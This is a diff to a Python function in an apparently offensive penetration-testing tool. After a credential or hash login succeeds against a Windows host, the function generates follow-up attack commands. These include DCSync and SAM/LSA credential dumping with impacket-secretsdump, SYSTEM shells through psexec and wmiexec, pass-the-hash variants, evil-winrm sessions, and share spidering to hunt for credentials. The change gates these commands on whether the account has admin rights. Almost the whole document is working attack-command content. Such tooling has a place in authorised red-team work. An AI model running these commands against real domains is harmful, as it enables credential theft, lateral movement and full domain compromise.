@@ -310,24 +310,27 @@ def build_suggestions(s: Success, ip: str, hostname: str,
 
     if s.auth_type == AuthType.PASSWORD:
         if proto == "smb":
+            # shares/SAM/LSA are auto-pulled by cred-enum above, so suggest only
+            # what is NOT already done — and gate admin-only actions on is_admin.
             if is_dc:
-                e += [("nxc --shares",
-                           f"nxc smb {qip} -u {quser} -p {qpw} --shares"),
-                      ("secretsdump -just-dc",
-                           f"impacket-secretsdump -just-dc {qurl_pw}"),
-                      ("smbclient (interactive)",
-                           f"smbclient //{ip}/<SHARE> -U {qsmb_user}")]
+                if s.is_admin:   # admin on the DC == DCSync the whole domain
+                    e.append(("secretsdump -just-dc (DCSync)",
+                                  f"impacket-secretsdump -just-dc {qurl_pw}"))
+                e.append(("smbclient (interactive)",
+                              f"smbclient //{ip}/<SHARE> -U {qsmb_user}"))
             else:
-                e += [("enum4linux-ng",
-                           f"enum4linux-ng -A -u {quser} -p {qpw} {qip}"),
-                      ("nxc --shares",
-                           f"nxc smb {qip} -u {quser} -p {qpw} --shares"),
-                      ("secretsdump (SAM+LSA)",
-                           f"impacket-secretsdump {qurl_pw}"),
-                      ("psexec (SYSTEM shell)",
-                           f"impacket-psexec {qurl_pw}"),
-                      ("smbclient (interactive)",
-                           f"smbclient //{ip}/<SHARE> -U {qsmb_user}")]
+                if s.is_admin:   # Pwn3d — get a SYSTEM shell / reuse creds elsewhere
+                    e += [("psexec (SYSTEM shell)",
+                               f"impacket-psexec {qurl_pw}"),
+                          ("secretsdump (re-dump / other hosts)",
+                               f"impacket-secretsdump {qurl_pw}")]
+                else:            # plain user — hunt readable shares for creds
+                    e += [("enum4linux-ng",
+                               f"enum4linux-ng -A -u {quser} -p {qpw} {qip}"),
+                          ("spider shares for creds",
+                               f"nxc smb {qip} -u {quser} -p {qpw} -M spider_plus")]
+                e.append(("smbclient (interactive)",
+                              f"smbclient //{ip}/<SHARE> -U {qsmb_user}"))
         elif proto == "winrm":
             e.append(("evil-winrm", f"evil-winrm -i {qip} -u {quser} -p {qpw}"))
         elif proto == "wmi":
@@ -378,22 +381,24 @@ def build_suggestions(s: Success, ip: str, hostname: str,
     elif s.auth_type == AuthType.HASH:
         ha = q(pth_hash) if pth_hash else "NT"
         if proto == "smb":
+            # shares auto-pulled by cred-enum; gate admin-only PtH actions.
             if is_dc:
-                e += [("nxc --shares [PtH]",
-                           f"nxc smb {qip} -u {quser} -H {qhash} --shares"),
-                      ("secretsdump -just-dc [PtH]",
-                           f"impacket-secretsdump -just-dc {qurl_nopw} -hashes :{ha}"),
-                      ("psexec [PtH]",
-                           f"impacket-psexec {qurl_nopw} -hashes :{ha}")]
+                if s.is_admin:
+                    e.append(("secretsdump -just-dc [PtH] (DCSync)",
+                                  f"impacket-secretsdump -just-dc {qurl_nopw} -hashes :{ha}"))
+                e.append(("smbclient [PtH]",
+                              f"nxc smb {qip} -u {quser} -H {qhash} --shares  # then smbclient -N / --pw-nt-hash"))
             else:
-                e += [("nxc --shares [PtH]",
-                           f"nxc smb {qip} -u {quser} -H {qhash} --shares"),
-                      ("secretsdump [PtH]",
-                           f"impacket-secretsdump {qurl_nopw} -hashes :{ha}"),
-                      ("psexec [PtH]",
-                           f"impacket-psexec {qurl_nopw} -hashes :{ha}"),
-                      ("wmiexec [PtH]",
-                           f"impacket-wmiexec {qurl_nopw} -hashes :{ha}")]
+                if s.is_admin:
+                    e += [("psexec [PtH] (SYSTEM shell)",
+                               f"impacket-psexec {qurl_nopw} -hashes :{ha}"),
+                          ("wmiexec [PtH]",
+                               f"impacket-wmiexec {qurl_nopw} -hashes :{ha}"),
+                          ("secretsdump [PtH] (other hosts)",
+                               f"impacket-secretsdump {qurl_nopw} -hashes :{ha}")]
+                else:
+                    e.append(("spider shares for creds [PtH]",
+                                  f"nxc smb {qip} -u {quser} -H {qhash} -M spider_plus"))
         elif proto == "winrm":
             e.append(("evil-winrm [PtH]",
                        f"evil-winrm -i {qip} -u {quser} -H {qhash}"))
